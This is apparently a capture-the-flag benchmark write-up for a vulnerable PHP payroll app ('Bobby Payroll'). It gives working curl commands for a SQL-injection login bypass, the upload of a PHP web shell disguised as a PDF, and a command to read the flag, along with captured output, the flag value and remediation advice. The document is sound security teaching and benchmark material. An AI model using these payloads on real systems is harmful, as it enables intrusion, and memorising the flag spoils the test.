# XBEN-029-24 — Bobby Payroll

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** SQL injection (login form, both `username` and `password` fields) chained with weak file-extension check → unrestricted PHP upload

## Summary

`app/website/index.php` builds two raw SQL queries by string concatenation with
unsanitized POST input:

```php
$check_details = mysqli_query($db_connect, "SELECT username FROM users WHERE username = '$realusername' ");
...
$sql = mysqli_query($db_connect, "SELECT user_id FROM users WHERE username = '$usernamenew' AND password = MD5(CONCAT(MD5('$password'), MD5('$usernamenew'))) LIMIT 1 ");
```

`$realusername` comes straight from `$_POST['username']` and `$password` straight
from `$_POST['password']` — neither is escaped. The second query embeds
`$password` directly inside the SQL text (not just inside the PHP `MD5()`
function), so it is injectable independently of the login credentials: an
attacker can break out of the `MD5('...')` string/parentheses in the password
field and append `OR 1=1` to force the row-count check (`mysqli_num_rows == 1`)
to succeed without knowing the real admin password, since only one row exists in
the `users` table.

Once authenticated, `app/website/upload.php` "restricts" uploads to PDFs with:

```php
if (strpos($fileName, '.pdf') !== false) { ... move_uploaded_file(...) ... }
```

This only checks that the substring `.pdf` appears anywhere in the filename, and
the file is saved under its *original* name — so `shell.pdf.php` passes the
check (contains `.pdf`) but is saved with a `.php` extension and executed by
Apache/PHP when requested.

## Exploit

### 1. SQL-injection authentication bypass via the `password` field

```bash
PORT=63286
curl -s -c /tmp/xben029_cookies.txt -X POST "http://localhost:${PORT}/index.php" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=x'), MD5('x'))) OR 1=1-- -" \
  --data-urlencode "submit=submit"
```

This turns the second query's `WHERE` clause into:
```sql
WHERE username = 'admin' AND password = MD5(CONCAT(MD5('x'), MD5('x'))) OR 1=1-- -'), MD5('admin'))) LIMIT 1
```
`-- -` comments out the rest of the line, and `OR 1=1` makes the row match
regardless of the real password, so `mysqli_num_rows($sql) == 1` succeeds.

Captured output:
```
{"response":"Success"}
```
`/tmp/xben029_cookies.txt` now holds a valid authenticated `PHPSESSID` cookie.

### 2. Upload a PHP web shell disguised as a PDF

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.pdf.php
curl -s -b /tmp/xben029_cookies.txt -X POST "http://localhost:${PORT}/upload.php" \
  -F "invoice=@/tmp/shell.pdf.php;filename=shell.pdf.php;type=application/pdf"
```

Captured output:
```
File is successfully uploaded to /uploaded_invoices/
```

### 3. Execute the shell to read the flag

```bash
curl -s "http://localhost:${PORT}/uploaded_invoices/shell.pdf.php?c=cat+/FLAG.txt"
```

Captured output:
```
FLAG{b4b84cbe3c0f031296c205a3abc7f29e9b9caa84ba55614394f331549e798798}
```

## Remediation notes

- Use parameterized queries / prepared statements for both the username and
  password lookups; never interpolate `$_POST` values into SQL text.
- Validate uploaded files by a strict allow-list of file extensions (checking
  the actual suffix, not `strpos`) and by verifying real file content/MIME
  type server-side; store uploads outside the web-servable directory or under
  randomized, non-executable names; disable PHP execution in the upload
  directory via web server configuration.
